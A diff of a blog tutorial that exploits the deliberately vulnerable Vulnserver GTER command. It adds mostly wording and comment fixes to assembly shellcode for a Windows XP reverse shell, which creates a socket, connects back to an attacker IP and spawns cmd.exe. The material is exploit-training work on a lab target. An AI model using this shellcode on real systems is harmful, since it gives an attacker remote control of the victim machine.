@@ -14,7 +14,7 @@
 :about2: "We don't need the key, we'll break in" RATM
 :source: https://unsplash.com/photos/mk7D-4UCfmg
 
-= Vulnserver GTER Exploitation
+= GTER exploit by reusing sockets
 
 This is the third article on the series of exploiting `Vulnserver`,
 a VbD (Vulnerable-by-Design) application in which you can practice Windows
@@ -68,14 +68,14 @@ Saved as: /dev/null
 ----
 
 This shellcode is 351 bytes long. And, if you remember on our link:../vulnserver-gter/[previous post],
-we see that we only had around 144 bytes to play.
+we only had around 144 bytes to play.
 
 The whole idea of reusing instructions is to minimize the resultant shellcode.
 
 To do that, we need to know what functions need to be called, with what
 parameters, and translate that to Assembler language to then convert it to
 our shellcode, having in mind to avoid null bytes that will led to become
-our shellcode unusable.
+our shellcode unusable. It sounds harder than it really is.
 
 With that in mind, let's look at the signatures of the needed functions:
 
@@ -94,8 +94,8 @@ SOCKET WSAAPI WSASocketA(
 );
 ----
 
-If we are going to write this in assembler, we must remind that the functions
-are called in a very specific way:
+If we are going to write this in assembler, we must remind that in the
+x86 architecture, the functions are called in a very specific way:
 
 . The parameters are pushed to the stack on reverse order
 . Then we call the required function
@@ -114,9 +114,9 @@ For example, the structure for calling `WSASocketA` function is as follows:
 resulting socket handle
 
 We also need to know the exact address of the `WSASocketA()` on the system.
-Normally, those function addresses won't change much on a specific version
+Normally, those function addresses won't change much on a specific versions
 of Windows, but will likely change over different updates, so keep that
-in mind when creating custom shellcode.
+in mind when creating custom shellcodes.
 
 For retrieving the addresss of functions on the current OS,
 you can use the link:http://www.vividmachines.com/shellcode/arwin.c[arwin]
@@ -130,8 +130,8 @@ arwin - win32 address resolution program - by steve hanna - v.01
 WSASocketA is located at 0x71ab8b6a in ws2_32
 ----
 
-Ok, with all the required information, we can proceed to write some Assembler
-now:
+Ok, with all the required information, we can proceed to write some Assembler.
+The required call to `WSASocketA` is written like this:
 
 .WSASocketA() in ASM
 [source,asm]
@@ -140,7 +140,7 @@ xor ebx,ebx             ; Zero out EBX
 push ebx                ; Push 'dwFlags' parameter
 push ebx                ; Push 'g' parameter
 push ebx                ; Push 'lpProtocolInfo' parameter
-mov bl,0x6               ; Protocol: IPPROTO_TCP=6
+mov bl,0x6              ; Protocol: IPPROTO_TCP=6
 push ebx                ; Push 'protocol' parameter
 xor ebx,ebx             ; Zero out EBX again
 inc ebx                 ; Type: SOCK_STREAM=1
@@ -148,12 +148,15 @@ push ebx                ; Push 'type' parameter
 inc ebx                 ; Af: AF_INET=2
 push ebx                ; Push 'af' parameter
 mov ebx,0x71ab8b6a      ; Address of WSASocketA() on WinXPSP3
-call ebx
+call ebx                ; call WSASocketA()
 xchg eax,esi            ; Save the returned socket handle on ESI
 ----
 
 
 === connect()
+
+The `connect()` call will actually create the connection back to the
+attacker, using the socket handle created by `WSASocketA`
 
 .connect() signature
 [source,cpp]
@@ -165,7 +168,7 @@ int WSAAPI connect(
 );
 ----
 
-`sockaddr` is in turn:
+The `sockaddr` parameter is in turn:
 
 [source,cpp]
 ----
@@ -185,7 +188,7 @@ arwin - win32 address resolution program - by steve hanna - v.01
 connect is located at 0x71ab4a07 in ws2_32
 ----
 
-Now, the connect() function in assembler will translate to:
+Now, the connect() function call in assembler will be written like:
 
 .connect() in assembler
 [source,asm]
@@ -208,9 +211,9 @@ call ebx                ; Call connect()
 ----
 
 Note that the attacker IP address parameter contains a null byte which
-will stop the injection of the payload. To overcome that, we can add an
-static value to that address, then substract it and push the result. This will
-be the final `connect()` payload:
+will stop the injection of the payload. To overcome that, we can add a
+static value to that address, substract it again, and push the result.
+This will be the final `connect()` payload:
 
 
 .connect() in assembler
@@ -230,7 +233,7 @@ xor ebx,ebx             ; Zero out EBX
 add bl,0x2              ; sa_family: AF_INET = 2
 push word bx            ; Push sa_family parameter
 mov ebx,esp             ; EBX now has the pointer to sockaddr structure
-push byte 0x16             ; Size of sockaddr: sa_family + sa_data = 16
+push byte 0x16          ; Size of sockaddr: sa_family + sa_data = 16
 push ebx                ; Push pointer ('name' parameter)
 push esi                ; Push saved socket handler ('s' parameter)
 mov ebx,0x71ab4a07      ; Address of connect() on WinXPSP3
@@ -238,6 +241,10 @@ call ebx                ; Call connect()
 ----
 
 === CreateProcess()
+
+Now comes the final function `CreateProcess` which is responsible for creating
+an instance of the `cmd.exe` command and divert the file descriptors to
+our newly created connection, to make the shell interactive for the attacker.
 
 .CreateProcess() signature
 [source,cpp]
@@ -305,12 +312,13 @@ arwin - win32 address resolution program - by steve hanna - v.01
 CreateProcessA is located at 0x7c80236b in kernel32
 ----
 
-In assembler, this will look like this:
+In assembler, the call to `CreateProcess` will look like this:
 
 .CreateProcess() in assembler
 [source,asm]
 ----
-mov ebx,0x646d6341      ; Move 'cmda' to EBX.
+mov ebx,0x646d6341      ; Move 'cmda' to EBX. The trailing 'a' is to avoid
+                        ; injecting null bytes.
 shr ebx,0x8             ; Make EBX = 'cmd\x00'
 push ebx                ; Push application name
 mov ecx,esp             ; Make ECX a pointer to the 'cmd' command
@@ -338,7 +346,7 @@ push edx                ; lpDesktop = NULL
 push edx                ; lpReserved = NULL
 add dl,44               ; cb = 44
 push edx                ; Push _STARTUPINFOA on stack
-mov eax,esp       	   ; Make EAX a pointer to _STARTUPINFOA
+mov eax,esp       	    ; Make EAX a pointer to _STARTUPINFOA
 xor edx,edx             ; Zero out EDX again
 
 ; Fill PROCESS_INFORMATION struct
@@ -378,7 +386,7 @@ xor ebx,ebx             ; Zero out EBX
 push ebx                ; Push 'dwFlags' parameter
 push ebx                ; Push 'g' parameter
 push ebx                ; Push 'lpProtocolInfo' parameter
-mov bl,0x6               ; Protocol: IPPROTO_TCP=6
+mov bl,0x6              ; Protocol: IPPROTO_TCP=6
 push ebx                ; Push 'protocol' parameter
 xor ebx,ebx             ; Zero out EBX again
 inc ebx                 ; Type: SOCK_STREAM=1
@@ -386,7 +394,7 @@ push ebx                ; Push 'type' parameter
 inc ebx                 ; Af: AF_INET=2
 push ebx                ; Push 'af' parameter
 mov ebx,0x71ab8b6a      ; Address of WSASocketA() on WinXPSP3
-call ebx
+call ebx                ; Call WSASocketA()
 xchg eax,esi            ; Save the returned socket handle on ESI
 
 ; connect()
@@ -404,15 +412,16 @@ xor ebx,ebx             ; Zero out EBX
 add bl,0x2              ; sa_family: AF_INET = 2
 push word bx            ; Push sa_family parameter
 mov ebx,esp             ; EBX now has the pointer to sockaddr structure
-push byte 0x16             ; Size of sockaddr: sa_family + sa_data = 16
+push byte 0x16          ; Size of sockaddr: sa_family + sa_data = 16
 push ebx                ; Push pointer ('name' parameter)
 push esi                ; Push saved socket handler ('s' parameter)
 mov ebx,0x71ab4a07      ; Address of connect() on WinXPSP3
-call ebx
+call ebx                ; Call connect()
 
 ; CreateProcess()
 
-mov ebx,0x646d6341      ; Move 'cmda' to EBX.
+mov ebx,0x646d6341      ; Move 'cmda' to EBX. The trailing 'a' is to avoid
+                        ; injecting null bytes.
 shr ebx,0x8             ; Make EBX = 'cmd\x00'
 push ebx                ; Push application name
 mov ecx,esp             ; Make ECX a pointer to the 'cmd' command
@@ -440,7 +449,7 @@ push edx                ; lpDesktop = NULL
 push edx                ; lpReserved = NULL
 add dl,44               ; cb = 44
 push edx                ; Push _STARTUPINFOA on stack
-mov eax,esp       	   ; Make EAX a pointer to _STARTUPINFOA
+mov eax,esp       	    ; Make EAX a pointer to _STARTUPINFOA
 xor edx,edx             ; Zero out EDX again
 
 ; Fill PROCESS_INFORMATION struct
@@ -464,7 +473,7 @@ push ebx                ; lpThreadAttributes
 push ebx                ; lpProcessAttributes
 push ecx                ; lpCommandLine = Pointer to 'cmd\x00'
 push ebx                ; lpApplicationName
-mov ebx,0x7c80236b         ; Call CreateProcess()
+mov ebx,0x7c80236b      ; Call CreateProcess()
 call ebx
 ----
 
@@ -564,8 +573,15 @@ image::esp1.png[ESP]
 
 We can see that the ESP register is only 24 bytes below the end of our
 custom shellcode. That means that with every `PUSH` performed on our
-custom shellcode, that pointer will be going do be closer to our custom
+custom shellcode, that pointer will be going to be closer to our custom
 shellcode and will start *overwriting* it. That's not good news.
+
+This graph will illustrate the issue:
+
+image::stackgrowth.png[ESP]
+
+As the execution flows towards a higher memory address, the stack grows
+backwards and will eventually overwrite our shellcode.
 
 However, if you look at the image again, you can see that the `EAX` register
 points to the `GTER /.:/` string which is above our shellcode.
